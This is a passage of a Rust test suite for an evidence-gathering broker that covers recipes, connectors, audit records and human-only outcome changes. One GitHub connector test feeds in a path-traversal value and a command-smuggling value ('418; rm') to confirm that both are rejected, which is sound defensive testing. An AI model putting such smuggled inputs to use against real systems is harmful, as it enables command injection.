            .investigate(no_recipe, &demo::engineer(&scenario))
            .unwrap_err()
            .code,
        ErrorCode::InvalidRecipe
    );
    let mut bad_plan = demo::request(&scenario);
    bad_plan.plan = Some(vec![RecipeStep {
        filters: [("commit".to_string(), "9f1c*".to_string())]
            .into_iter()
            .collect(),
        ..failed_deployment().steps[2].clone()
    }]);
    assert!(broker
        .investigate(bad_plan, &demo::engineer(&scenario))
        .is_err());
    assert_eq!(broker.store.audits.len(), before + 2);
    for audit in &broker.store.audits[before..] {
        assert_eq!(audit.stop_reason, StopReason::Rejected);
        assert!(audit.recipe.is_none() && audit.steps.is_empty() && !audit.errors.is_empty());
        assert!(broker.store.audit(&audit.query_id).is_some());
    }
}

/** 55. Changing someone else's outcome takes a human reviewer, and the replaced outcome is kept
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn outcome_changes_need_a_reviewer_and_are_kept() {
    let scenario = demo::scenario().unwrap();
    let (mut broker, result) = investigate(&scenario);
    let episode = result.pack.episode_id.clone().unwrap();
    let deployment = result
        .pack
        .evidence
        .iter()
        .filter(|item| item.evidence_type == EvidenceType::Deployment)
        .map(|item| item.evidence_id.clone())
        .collect::<Vec<_>>();
    let recorder = Actor::new("oncall@acme.example", ActorKind::Human);
    broker
        .store
        .record_outcome(
            &episode,
            &recorder,
            false,
            EpisodeOutcome::Failed,
            deployment.clone(),
            1,
        )
        .unwrap();
    let colleague = Actor::new("dev@acme.example", ActorKind::Human);
    let refused = broker.store.record_outcome(
        &episode,
        &colleague,
        false,
        EpisodeOutcome::Succeeded,
        deployment.clone(),
        2,
    );
    assert_eq!(refused.unwrap_err().code, ErrorCode::Unauthorized);
    let agent = Actor::new("claude@ses_demo01", ActorKind::Agent);
    assert!(broker
        .store
        .record_outcome(
            &episode,
            &agent,
            true,
            EpisodeOutcome::Succeeded,
            deployment.clone(),
            3
        )
        .is_err());
    broker
        .store
        .record_outcome(
            &episode,
            &colleague,
            true,
            EpisodeOutcome::PartiallyVerified,
            deployment.clone(),
            4,
        )
        .unwrap();
    let stored = &broker.store.episodes[&episode];
    assert_eq!(stored.outcome, Some(EpisodeOutcome::PartiallyVerified));
    assert_eq!(stored.outcome_history.len(), 1);
    assert_eq!(stored.outcome_history[0].outcome, EpisodeOutcome::Failed);
    assert_eq!(stored.outcome_history[0].recorded_by, recorder);
    assert_eq!(stored.outcome_history[0].evidence, deployment);
}

/** 56. Only evidence of a runtime environment is subject to the actor's environment permission
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn environment_check_skips_environment_free_types() {
    use EvidenceType as E;
    for kind in [
        E::Deployment,
        E::Verification,
        E::RuntimeLog,
        E::Metric,
        E::Configuration,
        E::CiRun,
        E::TestReport,
    ] {
        assert!(kind.is_environment_bound(), "{kind:?}");
    }
    for kind in [
        E::Task,
        E::PullRequest,
        E::CodeChange,
        E::AgentSession,
        E::ToolCall,
        E::AgentEvent,
        E::GraphState,
        E::Policy,
        E::Validation,
    ] {
        assert!(!kind.is_environment_bound(), "{kind:?}");
    }
}

/** 57. The clock: a fixed clock is deterministic and has no nonce; the system clock's nonce differs
 * between readings; a copied fixed clock continues on its own
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn clock_nonce_and_copies() {
    let fixed = Clock::fixed(10);
    assert_eq!((fixed.now(), fixed.now()), (10, 11));
    assert_eq!(fixed.nonce(), "");
    let copy = fixed.clone();
    assert_eq!((copy.now(), fixed.now()), (12, 12));
    let system = Clock::system();
    assert_ne!(system.nonce(), system.nonce());
    assert!(!system.nonce().is_empty());
}

/** 58. A source that cannot answer within the time budget answers Timeout instead of holding the
 * investigation; the gap reads Unavailable
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn slow_connector_times_out() {
    let scenario = demo::scenario().unwrap();
    let mut broker = broker(&scenario);
    let ci_records = scenario
        .resources
        .iter()
        .find(|resource| resource.resource_id == "ci")
        .unwrap()
        .records
        .clone();
    broker
        .connect(
            "ci",
            Box::new(
                FixtureConnector::new(ci_records).with_behavior(FixtureBehavior::Slow(600_000)),
            ),
        )
        .unwrap();
    let mut request = demo::request(&scenario);
    request.budget.max_time_ms = 30_000;
    let started = std::time::Instant::now();
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    assert!(
        started.elapsed() < std::time::Duration::from_secs(20),
        "the slow source did not hold the investigation"
    );
    let ci = result
        .audit
        .steps
        .iter()
        .find(|step| step.step_id == "ci")
        .unwrap();
    assert_eq!(ci.connector_status, Some(ConnectorStatus::Timeout));
    let missing = result
        .pack
        .missing_evidence
        .iter()
        .find(|missing| missing.evidence_type == EvidenceType::CiRun)
        .unwrap();
    assert_eq!(missing.state, SourceState::Unavailable);
}

/** 59. Git honors the deadline, and lists commits a page at a time
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn git_honors_deadlines_and_pages() {
    let root = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let git = super::resources::local::GitConnector { root };
    let late = git.fetch_within("HEAD", std::time::Instant::now());
    assert_eq!(late.status, ConnectorStatus::Timeout);
    let spec = QuerySpec {
        evidence_type: Some(EvidenceType::CodeChange),
        filters: Default::default(),
        since: None,
        until: None,
        limit: 2,
        cursor: None,
        scope: QueryScope::default(),
    };
    let first = git.query(&spec);
    if first.records.len() < 2 {
        return; // a shallow clone has too little history to page
    }
    let cursor = first
        .next_cursor
        .clone()
        .expect("a full page offers a cursor");
    let second = git.query(&QuerySpec {
        cursor: Some(cursor),
        ..spec.clone()
    });
    assert!(second.records.iter().all(|record| first
        .records
        .iter()
        .all(|seen| seen.record_id != record.record_id)));
}

/** 60. DataSea reads its log once per investigation: within one it sees a consistent snapshot,
 * and the next investigation sees new events
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn datasea_reads_once_per_investigation() {
    let directory = tempfile::tempdir().unwrap();
    let store = datasea_with_task(directory.path());
    let connector = super::resources::local::DataSeaConnector::new(store.clone());
    let spec = QuerySpec {
        evidence_type: Some(EvidenceType::ToolCall),
        filters: Default::default(),
        since: None,
        until: None,
        limit: 10,
        cursor: None,
        scope: QueryScope::default(),
    };
    assert_eq!(connector.query(&spec).records.len(), 1);
    let mut event = crate::telemetry::events::Event::new(
        "tool_call.decided",
        crate::telemetry::model::Domain::Authorization,
        "repo",
        "call-2",
    );
    event.scope.foxx_task_id = Some("tsk_1".into());
    store.append(event).unwrap();
    assert_eq!(
        connector.query(&spec).records.len(),
        1,
        "one snapshot per investigation"
    );
    connector.begin();
    assert_eq!(
        connector.query(&spec).records.len(),
        2,
        "the next investigation reads again"
    );
}

/** 61. Linking governance only where something changed gives the same links as linking everything
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn incremental_governance_link_equals_full() {
    let scenario = demo::scenario().unwrap();
    let (broker, _) = investigate(&scenario);
    let incremental = broker
        .store
        .graph
        .relations
        .keys()
        .cloned()
        .collect::<BTreeSet<_>>();
    let mut full = broker.store.graph.clone();
    crate::capture::correlate::link::link_governance(&mut full);
    assert_eq!(
        full.relations.keys().cloned().collect::<BTreeSet<_>>(),
        incremental
    );
    let mut second = broker;
    second
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    let mut refull = second.store.graph.clone();
    crate::capture::correlate::link::link_governance(&mut refull);
    assert_eq!(
        refull.relations.keys().cloned().collect::<BTreeSet<_>>(),
        second
            .store
            .graph
            .relations
            .keys()
            .cloned()
            .collect::<BTreeSet<_>>()
    );
}

/** 62. Saving without changes rewrites no file
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn unchanged_collections_are_not_rewritten() {
    let directory = tempfile::tempdir().unwrap();
    let scenario = demo::scenario().unwrap();
    let mut broker = broker(&scenario);
    broker.store = CaptureStore::open(directory.path()).unwrap();
    broker
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    broker.store.save().unwrap();
    let evidence = directory.path().join("evidence.jsonl");
    let before = std::fs::metadata(&evidence).unwrap().modified().unwrap();
    std::thread::sleep(std::time::Duration::from_millis(30));
    broker.store.save().unwrap();
    assert_eq!(
        std::fs::metadata(&evidence).unwrap().modified().unwrap(),
        before
    );
}

/** 63. Runtime logs and tool calls are Confidential whatever the redactor found; commit keys and
 * environment names are one entity whatever their case; a commit named commit_sha is found
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn type_floors_and_normalized_keys() {
    let scenario = demo::scenario().unwrap();
    let definition = demo::definition(&scenario.resources[0], &scenario);
    for (kind, expected) in [
        (EvidenceType::RuntimeLog, Sensitivity::Confidential),
        (EvidenceType::ToolCall, Sensitivity::Confidential),
        (EvidenceType::CiRun, Sensitivity::Internal),
    ] {
        let source = record(
            "plain",
            kind,
            json!({"message": "nothing secret here"}),
            Some(1),
        );
        let (artifact, _) = super::format::artifact::capture(&definition, &source, 1, "test");
        assert_eq!(artifact.sensitivity, expected, "{kind:?}");
    }
    assert_eq!(
        entity_id(EntityKind::Commit, "9F1C2AB7D4"),
        entity_id(EntityKind::Commit, " 9f1c2ab7d4")
    );
    assert_eq!(
        entity_id(EntityKind::Environment, "Production"),
        entity_id(EntityKind::Environment, "production")
    );
    assert_ne!(
        entity_id(EntityKind::Task, "PAY-142"),
        entity_id(EntityKind::Task, "pay-142"),
        "other keys keep their case"
    );
    let source = record(
        "run-1",
        EvidenceType::CiRun,
        json!({"commit_sha": "abc1234", "status": "success"}),
        Some(1),
    );
    let (artifact, stored) = super::format::artifact::capture(&definition, &source, 1, "test");
    let normalized = super::format::parsers::normalize(
        &definition,
        &source,
        &artifact,
        stored.as_ref(),
        1,
        None,
        None,
    );
    assert_eq!(normalized.refs.commit.as_deref(), Some("abc1234"));
}

/** 64. A constraint proposal must name its policy and state an effect that can only tighten
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn constraint_proposals_need_a_policy_and_a_tightening_effect() {
    let (mut broker, result) = investigate(&demo::scenario().unwrap());
    let agent = Actor::new("claude@ses_demo01", ActorKind::Agent);
    let propose = |broker: &mut EvidenceQueryBroker, content: Value, at: u64| {
        broker.store.propose(
            &agent,
            Proposal {
                content,
                contribution_type: ContributionType::ConstraintProposal,
                ..zone_proposal(&result, "refunds", None, Namespace::AgentProposed)
            },
            at,
        )
    };
    assert_eq!(
        propose(&mut broker, json!({"effect": "tighten"}), 1)
            .unwrap_err()
            .code,
        ErrorCode::InvalidTransition
    );
    assert_eq!(
        propose(
            &mut broker,
            json!({"effect": "harmonize", "policy": "refund_safety"}),
            2
        )
        .unwrap_err()
        .code,
        ErrorCode::PolicyChange,
        "an effect not known to only tighten is refused"
    );
    let accepted = propose(
        &mut broker,
        json!({"effect": "clarify", "policy": "refund_safety", "statement": "name the key field"}),
        3,
    )
    .unwrap();
    assert!(broker.store.contributions.contributions[&accepted].requires_crane_workflow);
}

/** 65. A discovery plan that finds a deployment adds it to the scope, and a pull request teaches
 * its task
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn discovery_plan_learns_deployment_and_task() {
    let scenario = demo::scenario().unwrap();
    let mut request = demo::request(&scenario);
    request.task_id = None;
    request.recipe = None;
    request.known.deployments = Vec::new();
    request.known.environment = Some("production".into());
    request.required_evidence = vec![EvidenceType::Deployment, EvidenceType::PullRequest];
    request.plan = Some(vec![
        RecipeStep {
            step_id: "find-deployments".into(),
            description: "Deployments in production".into(),
            resource_type: super::resources::registry::ResourceType::Deployment,
            operation: super::resources::registry::Operation::Query,
            evidence_type: EvidenceType::Deployment,
            record: None,
            filters: [("environment".to_string(), "{environment}".to_string())]
                .into_iter()
                .collect(),
            limit: 10,
            when: Predicate::Always,
            mandatory: false,
        },
        failed_deployment().steps[1].clone(),
    ]);
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    assert!(result
        .pack
        .scope
        .deployments
        .contains(&"dep-7731".to_string()));
    assert!(result
        .pack
        .scope
        .learned
        .iter()
        .any(|fact| fact.field == "deployment" && fact.value == "dep-7731"));
    assert_eq!(result.pack.scope.task_id.as_deref(), Some("PAY-142"));
}

/** 66. The discovery recipe finds the environment's deployments and adds them to the scope; the
 * pull request review recipe collects the change, its verification, and its governance
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn discovery_and_review_recipes_run() {
    let scenario = demo::scenario().unwrap();
    let mut discovery = demo::request(&scenario);
    discovery.task_id = None;
    discovery.known.pull_requests = Vec::new();
    discovery.known.deployments = Vec::new();
    discovery.known.environment = Some("production".into());
    discovery.recipe = None;
    discovery.investigation_class = "deployment-discovery".into();
    let mut broker = broker(&scenario);
    let found = broker
        .investigate(discovery, &demo::engineer(&scenario))
        .unwrap();
    assert_eq!(found.pack.retrieval.recipe_id, "deployment-discovery");
    assert_eq!(found.pack.status, InvestigationStatus::Sufficient);
    assert!(found
        .pack
        .scope
        .deployments
        .contains(&"dep-7731".to_string()));
    assert!(found
        .pack
        .evidence
        .iter()
        .any(|item| item.evidence_type == EvidenceType::Verification));
    let mut review = demo::request(&scenario);
    review.task_id = None;
    review.known.deployments = Vec::new();
    review.recipe = None;
    review.investigation_class = "pull-request-review".into();
    let reviewed = broker
        .investigate(review, &demo::engineer(&scenario))
        .unwrap();
    assert_eq!(reviewed.pack.retrieval.recipe_id, "pr-review");
    let types = reviewed
        .pack
        .evidence
        .iter()
        .map(|item| item.evidence_type)
        .collect::<BTreeSet<_>>();
    for kind in [
        EvidenceType::PullRequest,
        EvidenceType::CodeChange,
        EvidenceType::CiRun,
        EvidenceType::ToolCall,
        EvidenceType::GraphState,
        EvidenceType::Policy,
    ] {
        assert!(types.contains(&kind), "{kind:?} collected");
    }
    let tests = reviewed
        .pack
        .missing_evidence
        .iter()
        .find(|missing| missing.evidence_type == EvidenceType::TestReport)
        .unwrap();
    assert_eq!(tests.state, SourceState::Empty);
    assert!(reviewed
        .pack
        .assertions
        .iter()
        .any(|assertion| assertion.claim.predicate == "governed_zone_touched"));
    assert_pack_is_closed(&reviewed.pack, "review");
}

/** 67. One question class is served by one recipe; versions of that recipe may share it
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn one_recipe_per_class() {
    let mut book = RecipeBook::default();
    book.add(failed_deployment()).unwrap();
    book.add(super::broker::recipe::failed_deployment_v2())
        .unwrap();
    let mut rival = failed_deployment();
    rival.recipe_id = "rival-deployment".into();
    let refused = book.add(rival).unwrap_err();
    assert_eq!(refused.code, ErrorCode::InvalidRecipe);
    assert!(refused.message.contains("already does"));
}

/** 68. A human actor for the operator can be made only outside an AI agent session
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn human_operator_follows_the_agent_guard() {
    let operator = Actor::human_operator("person@example.com");
    match crate::trust::agent_environment() {
        Some(_) => assert_eq!(operator.unwrap_err().code, ErrorCode::Unauthorized),
        None => assert_eq!(operator.unwrap().kind, ActorKind::Human),
    }
}

/** 69. After the stopping rule found the required evidence complete, mandatory steps still run and
 * the others are skipped
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn mandatory_steps_run_after_satisfaction() {
    let scenario = demo::scenario().unwrap();
    let steps = failed_deployment().steps;
    let deployment = steps
        .iter()
        .find(|step| step.step_id == "deployment")
        .unwrap()
        .clone();
    let verification = RecipeStep {
        mandatory: true,
        ..steps
            .iter()
            .find(|step| step.step_id == "verification")
            .unwrap()
            .clone()
    };
    let policies = steps
        .iter()
        .find(|step| step.step_id == "policies")
        .unwrap()
        .clone();
    let mut request = demo::request(&scenario);
    request.recipe = None;
    request.required_evidence = vec![EvidenceType::Deployment];
    request.plan = Some(vec![deployment, verification, policies]);
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    let state = |id: &str| {
        result
            .audit
            .steps
            .iter()
            .find(|step| step.step_id == id)
            .unwrap()
            .state
    };
    assert_eq!(result.audit.stop_reason, StopReason::Satisfied);
    assert_eq!(state("verification"), StepState::Executed);
    assert_eq!(state("policies"), StepState::NotQueried);
}

/** Recorded GitHub API answers by path, standing in for the GitHub CLI
 * Fields
    - answers: std::collections::BTreeMap<String, super::resources::github::ApiAnswer> - by path
*/
struct RecordedGitHub {
    answers: std::collections::BTreeMap<String, super::resources::github::ApiAnswer>,
}

impl super::resources::github::GitHubApi for RecordedGitHub {
    /** Answer a recorded path; anything else is missing
     * Input
        - path: &str - API path
        - _deadline: Option<std::time::Instant> - unused
     * Output
        - ApiAnswer
    */
    fn get(
        &self,
        path: &str,
        _deadline: Option<std::time::Instant>,
    ) -> super::resources::github::ApiAnswer {
        self.answers
            .get(path)
            .cloned()
            .unwrap_or(super::resources::github::ApiAnswer::Missing)
    }
}

/** A GitHub connector for acme/payments answering from recorded responses
 * Input
    - None
 * Output
    - super::resources::github::GitHubConnector
*/
fn recorded_github() -> super::resources::github::GitHubConnector {
    use super::resources::github::ApiAnswer::Found;
    let answers = [
        (
            "repos/acme/payments/pulls/418",
            Found(json!({"title": "PAY-142: idempotency keys", "state": "open", "merged": false,
                "head": {"ref": "feature/pay-142", "sha": "9f1c2ab7d4"}, "user": {"login": "dev"},
                "updated_at": "2020-01-01T00:00:00Z"})),
        ),
        (
            "repos/acme/payments/commits/9f1c2ab7d4",
            Found(json!({"sha": "9f1c2ab7d4", "commit": {"message": "Require a key\n\nbody", "committer": {"date": "2020-01-01T00:00:01Z"}},
                "files": [{"filename": "app/refunds.py", "additions": 4, "deletions": 1}]})),
        ),
        (
            "repos/acme/payments/commits/9f1c2ab7d4/check-runs?per_page=50",
            Found(json!({"total_count": 3, "check_runs": [
                {"id": 1, "name": "build", "head_sha": "9f1c2ab7d4", "status": "completed", "conclusion": "success", "completed_at": "2020-01-01T00:01:00Z"},
                {"id": 2, "name": "lint", "head_sha": "9f1c2ab7d4", "status": "in_progress", "conclusion": null, "started_at": "2020-01-01T00:00:30Z"}
            ]})),
        ),
    ]
    .into_iter()
    .map(|(path, answer)| (path.to_string(), answer))
    .collect();
    super::resources::github::GitHubConnector::for_remote(
        "github.com/acme/payments",
        Box::new(RecordedGitHub { answers }),
    )
    .unwrap()
}

/** A query of one evidence type with one filter
 * Input
    - kind: EvidenceType - type
    - key: &str - filter key
    - value: &str - filter value
 * Output
    - QuerySpec
*/
fn filtered(kind: EvidenceType, key: &str, value: &str) -> QuerySpec {
    QuerySpec {
        evidence_type: Some(kind),
        filters: [(key.to_string(), value.to_string())].into_iter().collect(),
        since: None,
        until: None,
        limit: 50,
        cursor: None,
        scope: QueryScope::default(),
    }
}

/** 70. The GitHub connector reads pull requests, a commit's files, and its check runs, keeping
 * GitHub's own results (a run still in progress has no conclusion; more runs than read is partial)
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn github_connector_reads_pull_requests_commits_and_checks() {
    let github = recorded_github();
    let pr = github.fetch("418");
    assert_eq!(pr.status, ConnectorStatus::Ok);
    let record = &pr.records[0];
    assert_eq!(record.evidence_type, EvidenceType::PullRequest);
    assert_eq!(record.content["head_sha"], json!("9f1c2ab7d4"));
    assert_eq!(
        record.content["repository"],
        json!("github.com/acme/payments")
    );
    assert_eq!(record.metadata["commit"], "9f1c2ab7d4");
    assert_eq!(record.source_timestamp, Some(1_577_836_800_000));
    assert_eq!(
        github.fetch("999").records.len(),
        0,
        "a missing pull request is an empty answer"
    );
    let commit = github.query(&filtered(EvidenceType::CodeChange, "commit", "9f1c2ab7d4"));
    assert_eq!(
        commit.records[0].content["files"][0]["path"],
        json!("app/refunds.py")
    );
    assert_eq!(commit.records[0].content["subject"], json!("Require a key"));
    let checks = github.query(&filtered(EvidenceType::CiRun, "commit", "9f1c2ab7d4"));
    assert_eq!(
        checks.status,
        ConnectorStatus::Partial,
        "3 runs exist, 2 were read"
    );
    assert_eq!(checks.records[0].content["status"], json!("success"));
    assert_eq!(checks.records[1].content["status"], json!("in_progress"));
    let injected = github.query(&filtered(
        EvidenceType::CodeChange,
        "commit",
        "9f1c/../../x",
    ));
    assert_eq!(injected.status, ConnectorStatus::InvalidQuery);
    assert_eq!(
        github.fetch("418; rm").status,
        ConnectorStatus::InvalidQuery
    );
}

/** 71. GitHub failures keep their kind, and only GitHub repositories get a connector
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn github_failures_keep_their_kind() {
    use super::resources::github::{classify, unix_millis, ApiAnswer, GitHubConnector};
    assert_eq!(classify("gh: Not Found (HTTP 404)"), ApiAnswer::Missing);
    let status = |message: &str| match classify(message) {
        ApiAnswer::Failed(status, _) => Some(status),
        _ => None,
    };
    assert_eq!(
        status("gh: Bad credentials (HTTP 401)"),
        Some(ConnectorStatus::Unauthorized)
    );
    assert_eq!(
        status("gh: Resource not accessible (HTTP 403)"),
        Some(ConnectorStatus::Unauthorized)
    );
    assert_eq!(
        status("API rate limit exceeded for user (HTTP 403)"),
        Some(ConnectorStatus::RateLimited)
    );
    assert_eq!(
        status("gh: Server Error (HTTP 502)"),
        Some(ConnectorStatus::Unavailable)
    );
    assert_eq!(
        status("To get started with GitHub CLI, please run:  gh auth login"),
        Some(ConnectorStatus::Unauthorized)
    );
    assert_eq!(status("something odd"), Some(ConnectorStatus::Failed));
    assert_eq!(unix_millis("1970-01-01T00:00:00Z"), Some(0));
    assert_eq!(
        unix_millis("2020-01-01T00:00:00.123Z"),
        Some(1_577_836_800_000)
    );
    assert_eq!(unix_millis("2020-13-01T00:00:00Z"), None);
    assert_eq!(unix_millis("yesterday"), None);
    let none = |label: &str| {
        GitHubConnector::for_remote(
            label,
            Box::new(RecordedGitHub {
                answers: Default::default(),
            }),
        )
        .is_none()
    };
    assert!(none("local:/tmp/repo"));
    assert!(none("gitlab.com/acme/payments"));
    assert!(none("github.com/acme"));
    assert!(none("github.com/acme/pay ments"));
    assert!(!none("github.com/acme/payments"));
}

/** Check the connector contract on one connector: answers carry a snapshot or say why not, a
 * failure is never an empty success, get_metadata strips content, and filtering by a declared key
 * returns only records carrying that value
 * Input
    - label: &str - which connector, for failure messages
    - connector: &dyn ResourceConnector - connector
    - queries: &[QuerySpec] - queries that should answer
 * Output
    - None (panics on failure)
*/
fn assert_connector_contract(
    label: &str,
    connector: &dyn ResourceConnector,
    queries: &[QuerySpec],
) {
    for spec in queries {
        let outcome = connector.query(spec);
        if outcome.status.usable() {
            assert!(
                outcome.snapshot.is_some() || outcome.records.is_empty(),
                "{label}: an answer with records names its snapshot"
            );
        } else {
            assert!(
                outcome.records.is_empty() && outcome.error.is_some(),
                "{label}: a failure carries no records and says why"
            );
        }
        for record in &outcome.records {
            if let Some(kind) = spec.evidence_type {
                assert_eq!(
                    record.evidence_type, kind,
                    "{label}: only the requested type"
                );
            }
            for (key, value) in &spec.filters {
                if let Some(found) = record.metadata.get(key) {
                    assert_eq!(found, value, "{label}: filter {key} is honored");
                }
            }
            let described = connector.get_metadata(&record.record_id);
            assert!(
                described.records.iter().all(|item| item.content.is_null()),
                "{label}: get_metadata strips content"
            );
        }
    }
}

/** 72. Class guard: the fixture, DataSea, and GitHub connectors all keep the connector contract
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn connectors_keep_the_contract() {
    let scenario = demo::scenario().unwrap();
    for resource in &scenario.resources {
        let connector = FixtureConnector::new(resource.records.clone());
        let queries = resource
            .evidence_types
            .iter()
            .map(|kind| QuerySpec {
                evidence_type: Some(*kind),
                filters: Default::default(),
                since: None,
                until: None,
                limit: 50,
                cursor: None,
                scope: QueryScope::default(),
            })
            .collect::<Vec<_>>();
        assert_connector_contract(&resource.resource_id, &connector, &queries);
        let failing = FixtureConnector::new(resource.records.clone())
            .with_behavior(FixtureBehavior::Fail(ConnectorStatus::Unavailable));
        assert_connector_contract(
            &format!("{} failing", resource.resource_id),
            &failing,
            &queries,
        );
    }
    let directory = tempfile::tempdir().unwrap();
    let datasea =
        super::resources::local::DataSeaConnector::new(datasea_with_task(directory.path()));
    assert_connector_contract(
        "datasea",
        &datasea,
        &[
            filtered(EvidenceType::ToolCall, "task", "tsk_1"),
            filtered(EvidenceType::ToolCall, "session", "ses_1"),
        ],
    );
    assert_connector_contract(
        "github",
        &recorded_github(),
        &[
            filtered(EvidenceType::CodeChange, "commit", "9f1c2ab7d4"),
            filtered(EvidenceType::CiRun, "commit", "9f1c2ab7d4"),
            filtered(EvidenceType::PullRequest, "pull_request", "418"),
        ],
    );
}

/** 73. A store written before the newer fields existed (no recipe pins, pages, withheld counts,
 * outcome history, or later episodes) still opens, with the new fields at their defaults
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn older_store_layout_still_opens() {
    let directory = tempfile::tempdir().unwrap();
    let scenario = demo::scenario().unwrap();
    let mut broker = broker(&scenario);
    broker.store = CaptureStore::open(directory.path()).unwrap();
    let result = broker
        .investigate(demo::request(&scenario), &demo::engineer(&scenario))
        .unwrap();
    broker.store.save().unwrap();
    let strip = |file: &str, fields: &[&str], nested: Option<&str>| {
        let path = directory.path().join(file);
        let text = std::fs::read_to_string(&path).unwrap();
        let mut lines = Vec::new();
        for line in text.lines() {
            let mut value: Value = serde_json::from_str(line).unwrap();
            let targets = match nested {
                Some(key) => value[key]
                    .as_array_mut()
                    .map(|items| items.iter_mut().collect::<Vec<_>>())
                    .unwrap_or_default(),
                None => vec![&mut value],
            };
            for target in targets {
                if let Some(object) = target.as_object_mut() {
                    for field in fields {
                        object.remove(*field);
                    }
                }
            }
            if let Some(request) = value.get_mut("request").and_then(Value::as_object_mut) {
                request.remove("plan_required");
            }
            lines.push(value.to_string());
        }
        std::fs::write(&path, lines.join("\n") + "\n").unwrap();
    };
    strip("audit.jsonl", &["pages", "withheld"], Some("steps"));
    strip("episodes.jsonl", &["outcome_history"], None);
    strip("evidence.jsonl", &["observed_in"], None);
    std::fs::write(
        directory.path().join("state.json"),
        r#"{"schema_version": 0, "deliveries": {}, "cursors": {}}"#,
    )
    .unwrap();
    let reopened = CaptureStore::open(directory.path()).unwrap();
    let audit = reopened.audit(&result.audit.query_id).unwrap();
    assert!(audit
        .steps
        .iter()
        .all(|step| step.pages == 0 && step.withheld == 0));
    assert!(reopened
        .episodes
        .values()
        .all(|episode| episode.outcome_history.is_empty()));
    assert_eq!(reopened.evidence.len(), broker.store.evidence.len());
    reopened.packs[&result.pack.pack_id]
        .verify_manifest()
        .unwrap();
}

/** 74. A source that failed is not asked again by later steps of the same investigation
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn failed_source_is_not_asked_again() {
    let scenario = demo::scenario().unwrap();
    let metrics_step = failed_deployment()
        .steps
        .into_iter()
        .find(|step| step.step_id == "runtime-metrics")
        .unwrap();
    let again = RecipeStep {
        step_id: "metrics-again".into(),
        ..metrics_step.clone()
    };
    let mut request = demo::request(&scenario);
    request.recipe = None;
    // A requirement that stays unmet keeps the stopping rule from ending the plan early
    request.required_evidence = vec![EvidenceType::Metric];
    request.plan = Some(vec![
        RecipeStep {
            when: Predicate::Always,
            ..metrics_step
        },
        RecipeStep {
            when: Predicate::Always,
            ..again
        },
    ]);
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    let second = result
        .audit
        .steps
        .iter()
        .find(|step| step.step_id == "metrics-again")
        .unwrap();
    assert_eq!(second.state, StepState::Failed);
    assert_eq!(
        second.connector_status, None,
        "the source was not called again"
    );
    assert!(second.error.as_deref().unwrap().contains("not asked again"));
    let metrics_calls = result
        .audit
        .steps
        .iter()
        .filter(|step| {
            step.resource_id.as_deref() == Some("metrics") && step.connector_status.is_some()
        })
        .count();
    assert_eq!(metrics_calls, 1, "the metrics source was called once");
}

/** 75. A recipe that starts from a fact the request did not give says so
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn unknown_starting_conditions_are_reported() {
    let scenario = demo::scenario().unwrap();
    let mut request = demo::request(&scenario);
    request.known.deployments = Vec::new();
    let mut broker = broker(&scenario);
    let result = broker
        .investigate(request, &demo::engineer(&scenario))
        .unwrap();
    assert!(result.pack.warnings.iter().any(|warning| {
        warning.kind == WarningKind::Completeness
            && warning.message.contains("starts from a known deployment")
    }));
    let (_, complete) = investigate(&scenario);
    assert!(complete
        .pack
        .warnings
        .iter()
        .all(|warning| !warning.message.contains("starts from a known")));
}

/** 76. Resources of a type are asked by priority: the better one first, the next only when it did
 * not answer
 * Input
    - None
 * Output
    - None (panics on failure)
*/
#[test]
fn resources_are_asked_by_priority() {
    let scenario = demo::scenario().unwrap();
    let run = |primary_fails: bool| {
        let mut broker = broker(&scenario);
        let ci = scenario
            .resources
            .iter()
            .find(|resource| resource.resource_id == "ci")
            .unwrap();
        let mut primary = demo::definition(ci, &scenario);
        primary.priority = 1;
        broker.registry.register(primary, 1).unwrap();
        let mut mirror = demo::definition(ci, &scenario);
        mirror.resource_id = "ci-mirror".into();
        broker.registry.register(mirror, 1).unwrap();
        let behavior = if primary_fails {
            FixtureBehavior::Fail(ConnectorStatus::Unavailable)
        } else {
            FixtureBehavior::Normal
        };
        broker
            .connect(
                "ci",
                Box::new(FixtureConnector::new(ci.records.clone()).with_behavior(behavior)),
            )
            .unwrap();
        broker
            .connect(
                "ci-mirror",
                Box::new(FixtureConnector::new(ci.records.clone())),
            )
            .unwrap();
        let mut policy = demo::engineer(&scenario);
        policy.resources.insert("ci-mirror".into());
        broker
            .investigate(demo::request(&scenario), &policy)
            .unwrap()
    };
    let asked = |result: &crate::capture::broker::run::EvidenceQueryResult| {
        result
            .audit
            .steps
            .iter()
            .filter(|step| step.step_id == "ci")
            .map(|step| step.resource_id.clone().unwrap_or_default())
            .collect::<Vec<_>>()
    };
    assert_eq!(asked(&run(false)), vec!["ci".to_string()]);
    let fallback = run(true);
    assert_eq!(
